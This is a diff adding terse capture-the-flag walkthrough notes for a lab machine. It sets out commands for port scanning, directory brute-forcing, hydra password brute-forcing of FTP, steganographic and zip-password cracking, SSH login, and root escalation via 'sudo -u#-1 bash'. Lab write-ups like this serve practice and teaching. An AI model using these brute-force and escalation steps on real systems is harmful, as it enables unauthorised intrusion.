@@ -1,0 +1,25 @@
+sudo nmap IP # port scan
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://IP -x cgi,py,php
+open User-Agent switcher. press edit. try R as user agent. press ok. press reload.
+try C as user agent.
+hydra -l chris -P /usr/share/wordlists/rockyou.txt IP ftp // hydra is password cracking online tool.
+ftp IP // user name: chris. password: above.
+get item // download all items
+exiftool ***.png // check all info about image such as created time, etc.
+zsteg ***.png
+zsteg -e extradata: 0 ***.png > extradata.zip
+7zip e extradata.zip // unzip did not work
+zip2john extradata.zip > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt // check pass.
+7zip e extradata.zip // use pass from above
+cat *R.txt // check pass
+go to cyberchef. use magic option and decode password from above.
+steghide extract -sf *.jpg // use password from above
+ssh james@IP // use password from above.
+cat ***.txt 
+scp -P 22 james@IP:/home/james/Alien_autospy.jpg ./
+check image by google image search
+check Foxnews web site. find the article from abut the image.
+sudo -u#-1 bash // 
+cd /root
+cat root.txt
